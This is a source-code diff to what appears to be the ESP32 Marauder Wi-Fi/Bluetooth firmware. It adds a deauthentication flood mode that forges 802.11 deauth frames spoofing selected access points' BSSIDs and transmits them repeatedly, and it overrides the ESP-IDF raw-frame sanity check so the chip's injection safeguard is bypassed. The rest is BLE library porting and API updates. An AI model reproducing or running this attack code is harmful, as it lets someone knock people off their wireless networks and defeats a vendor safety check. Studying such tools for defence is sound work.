@@ -11,9 +11,12 @@ int num_eapol = 0;
 LinkedList<ssid>* ssids;
 LinkedList<AccessPoint>* access_points;
 
-int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
-    printf("Sanity check bypass called!\n");
-    return 0;
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
+    //printf("Sanity check bypass called!: %d, %d, %d\n", arg, arg2, arg3);
+    if (arg == 31337)
+      return 1;
+    else
+      return 0;
 }
 
 class bluetoothScanAllCallback: public BLEAdvertisedDeviceCallbacks {
@@ -142,10 +145,15 @@ WiFiScan::WiFiScan()
 }*/
 
 void WiFiScan::RunSetup() {
+  if (ieee80211_raw_frame_sanity_check(31337, 0, 0) == 1)
+    this->wsl_bypass_enabled = true;
+  else
+    this->wsl_bypass_enabled = false;
+    
   ssids = new LinkedList<ssid>();
   access_points = new LinkedList<AccessPoint>();
-  BLEDevice::init("");
-  pBLEScan = BLEDevice::getScan(); //create new scan
+  NimBLEDevice::init("");
+  pBLEScan = NimBLEDevice::getScan(); //create new scan
   this->ble_initialized = true;
   
   this->shutdownBLE();
@@ -278,6 +286,8 @@ void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color)
     RunRickRoll(scan_mode, color);
   else if (scan_mode == WIFI_ATTACK_AUTH)
     RunProbeFlood(scan_mode, color);
+  else if (scan_mode == WIFI_ATTACK_DEAUTH)
+    RunDeauthFlood(scan_mode, color);
   else if (scan_mode == BT_SCAN_ALL)
     RunBluetoothScan(scan_mode, color);
   else if (scan_mode == BT_SCAN_SKIMMERS)
@@ -354,6 +364,7 @@ void WiFiScan::StopScan(uint8_t scan_mode)
   (currentScanMode == WIFI_ATTACK_BEACON_LIST) ||
   (currentScanMode == WIFI_ATTACK_BEACON_SPAM) ||
   (currentScanMode == WIFI_ATTACK_AUTH) ||
+  (currentScanMode == WIFI_ATTACK_DEAUTH) ||
   (currentScanMode == WIFI_ATTACK_MIMIC) ||
   (currentScanMode == WIFI_ATTACK_RICK_ROLL) ||
   (currentScanMode == WIFI_PACKET_MONITOR) ||
@@ -403,7 +414,7 @@ String WiFiScan::getStaMAC()
   esp_wifi_set_storage(WIFI_STORAGE_RAM);
   esp_wifi_set_mode(WIFI_MODE_NULL);
   esp_wifi_start();
-  esp_err_t mac_status = esp_wifi_get_mac(ESP_IF_WIFI_STA, mac);
+  esp_err_t mac_status = esp_wifi_get_mac(WIFI_IF_AP, mac);
   this->wifi_initialized = true;
   sprintf(macAddrChr, 
           "%02X:%02X:%02X:%02X:%02X:%02X",
@@ -427,7 +438,7 @@ String WiFiScan::getApMAC()
   esp_wifi_set_storage(WIFI_STORAGE_RAM);
   esp_wifi_set_mode(WIFI_MODE_NULL);
   esp_wifi_start();
-  esp_err_t mac_status = esp_wifi_get_mac(ESP_IF_WIFI_AP, mac);
+  esp_err_t mac_status = esp_wifi_get_mac(WIFI_IF_AP, mac);
   this->wifi_initialized = true;
   sprintf(macAddrChr, 
           "%02X:%02X:%02X:%02X:%02X:%02X",
@@ -445,8 +456,8 @@ String WiFiScan::getApMAC()
 String WiFiScan::freeRAM()
 {
   char s[150];
-  sprintf(s, "RAM Free: %u bytes", system_get_free_heap_size());
-  this->free_ram = String(system_get_free_heap_size());
+  sprintf(s, "RAM Free: %u bytes", esp_get_free_heap_size());
+  this->free_ram = String(esp_get_free_heap_size());
   return String(s);
 }
 
@@ -601,6 +612,13 @@ void WiFiScan::RunInfo()
   display_obj.tft.setTextColor(TFT_CYAN);
   display_obj.tft.println("     Firmware: Marauder");
   display_obj.tft.println("      Version: " + display_obj.version_number + "\n");
+  display_obj.tft.println("      ESP-IDF: " + (String)esp_get_idf_version());
+
+  if (this->wsl_bypass_enabled)
+    display_obj.tft.println("   WSL Bypass: enabled\n");
+  else
+    display_obj.tft.println("   WSL Bypass: disabled\n");
+    
   display_obj.tft.println("  Station MAC: " + sta_mac);
   display_obj.tft.println("       AP MAC: " + ap_mac);
   display_obj.tft.println("     " + free_ram);
@@ -903,6 +921,36 @@ void WiFiScan::RunProbeFlood(uint8_t scan_mode, uint16_t color) {
   //Serial.println("End of func");
 }
 
+void WiFiScan::RunDeauthFlood(uint8_t scan_mode, uint16_t color) {
+  display_obj.TOP_FIXED_AREA_2 = 48;
+  display_obj.tteBar = true;
+  display_obj.print_delay_1 = 15;
+  display_obj.print_delay_2 = 10;
+  //display_obj.clearScreen();
+  display_obj.initScrollValues(true);
+  display_obj.tft.setTextWrap(false);
+  display_obj.tft.setTextColor(TFT_BLACK, color);
+  display_obj.tft.fillRect(0,16,240,16, color);
+  display_obj.tft.drawCentreString(" Deauth Flood ",120,16,2);
+  display_obj.touchToExit();
+  display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
+  packets_sent = 0;
+  //esp_wifi_set_mode(WIFI_MODE_STA);
+  //WiFi.mode(WIFI_AP_STA);
+  esp_wifi_init(&cfg);
+  esp_wifi_set_storage(WIFI_STORAGE_RAM);
+  //WiFi.mode(WIFI_AP_STA);
+  esp_wifi_set_mode(WIFI_AP_STA);
+  esp_wifi_start();
+  esp_wifi_set_promiscuous_filter(NULL);
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_max_tx_power(78);
+  this->wifi_initialized = true;
+  initTime = millis();
+  //display_obj.clearScreen();
+  //Serial.println("End of func");
+}
+
 // Function to prepare for beacon spam
 void WiFiScan::RunBeaconSpam(uint8_t scan_mode, uint16_t color)
 {
@@ -1081,9 +1129,9 @@ void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color)
 
   Serial.println("BT Controller Status: " + (String)esp_bt_controller_get_status());
   */
-  
-  BLEDevice::init("");
-  pBLEScan = BLEDevice::getScan(); //create new scan
+  NimBLEDevice::setScanFilterMode(CONFIG_BTDM_SCAN_DUPL_TYPE_DEVICE);
+  NimBLEDevice::init("");
+  pBLEScan = NimBLEDevice::getScan(); //create new scan
   if (scan_mode == BT_SCAN_ALL)
   {
     display_obj.TOP_FIXED_AREA_2 = 48;
@@ -1097,7 +1145,7 @@ void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color)
     display_obj.touchToExit();
     display_obj.tft.setTextColor(TFT_CYAN, TFT_BLACK);
     display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
-    pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback());
+    pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback(), false);
     //bluetoothScanAllCallback myCallbacks;
     //pBLEScan->setAdvertisedDeviceCallbacks(&myCallbacks);
   }
@@ -1115,12 +1163,13 @@ void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color)
     display_obj.twoPartDisplay("Scanning for\nBluetooth-enabled skimmers\nHC-03, HC-05, and HC-06...");
     display_obj.tft.setTextColor(TFT_BLACK, TFT_DARKGREY);
     display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
-    pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanSkimmersCallback());
+    pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanSkimmersCallback(), false);
   }
   pBLEScan->setActiveScan(true); //active scan uses more power, but get results faster
-  pBLEScan->setInterval(100);
-  pBLEScan->setWindow(99);  // less or equal setInterval value
-  pBLEScan->start(0, scanCompleteCB);
+  pBLEScan->setInterval(97);
+  pBLEScan->setWindow(37);  // less or equal setInterval value
+  pBLEScan->setMaxResults(0);
+  pBLEScan->start(0, scanCompleteCB, false);
   Serial.println("Started BLE Scan");
   this->ble_initialized = true;
   initTime = millis();
@@ -1956,6 +2005,42 @@ void WiFiScan::sendProbeAttack(uint32_t currentTime) {
   }
 }
 
+void WiFiScan::sendDeauthAttack(uint32_t currentTime) {
+  // Itterate through all access points in list
+  for (int i = 0; i < access_points->size(); i++) {
+
+    // Check if active
+    if (access_points->get(i).selected) {
+      this->set_channel = access_points->get(i).channel;
+      esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
+      delay(1);
+      
+      // Build packet
+      
+      deauth_frame_default[10] = access_points->get(i).bssid[0];
+      deauth_frame_default[11] = access_points->get(i).bssid[1];
+      deauth_frame_default[12] = access_points->get(i).bssid[2];
+      deauth_frame_default[13] = access_points->get(i).bssid[3];
+      deauth_frame_default[14] = access_points->get(i).bssid[4];
+      deauth_frame_default[15] = access_points->get(i).bssid[5];
+
+      deauth_frame_default[16] = access_points->get(i).bssid[0];
+      deauth_frame_default[17] = access_points->get(i).bssid[1];
+      deauth_frame_default[18] = access_points->get(i).bssid[2];
+      deauth_frame_default[19] = access_points->get(i).bssid[3];
+      deauth_frame_default[20] = access_points->get(i).bssid[4];
+      deauth_frame_default[21] = access_points->get(i).bssid[5];      
+
+      // Send packet
+      esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+      esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+      esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+
+      packets_sent = packets_sent + 3;
+    }
+  }
+}
+
 
 void WiFiScan::wifiSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
 {
@@ -2615,6 +2700,24 @@ void WiFiScan::main(uint32_t currentTime)
   else if (currentScanMode == WIFI_ATTACK_AUTH) {
     for (int i = 0; i < 55; i++)
       this->sendProbeAttack(currentTime);
+
+    if (currentTime - initTime >= 1000) {
+      initTime = millis();
+      String displayString = "";
+      String displayString2 = "";
+      displayString.concat("packets/sec: ");
+      displayString.concat(packets_sent);
+      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
+        displayString2.concat(" ");
+      display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
+      display_obj.showCenterText(displayString2, 160);
+      display_obj.showCenterText(displayString, 160);
+      packets_sent = 0;
+    }
+  }
+  else if (currentScanMode == WIFI_ATTACK_DEAUTH) {
+    for (int i = 0; i < 55; i++)
+      this->sendDeauthAttack(currentTime);
 
     if (currentTime - initTime >= 1000) {
       initTime = millis();
